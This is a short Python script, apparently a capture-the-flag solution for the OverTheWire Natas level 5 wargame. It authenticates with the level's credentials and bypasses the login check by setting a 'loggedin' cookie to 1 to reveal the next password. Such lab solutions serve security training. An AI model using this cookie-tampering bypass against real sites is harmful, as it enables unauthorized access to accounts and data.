# Natas5 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas5.natas.labs.overthewire.org"

auth_name = 'natas5'
auth_pass = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

r = s.get(URL)

# Unlike prior challenges, this one features a cookie, which can easily be
# seen as such:     print (r.cookies)

# By changing the value of 'loggedin' to 1 (instead of 0),
# the password can be granted, as the user is now 'logged in'
COOKIES = dict(loggedin='1')

r = s.get(URL, cookies=COOKIES)

for x in r.iter_lines():
    if "password" in x:
        print x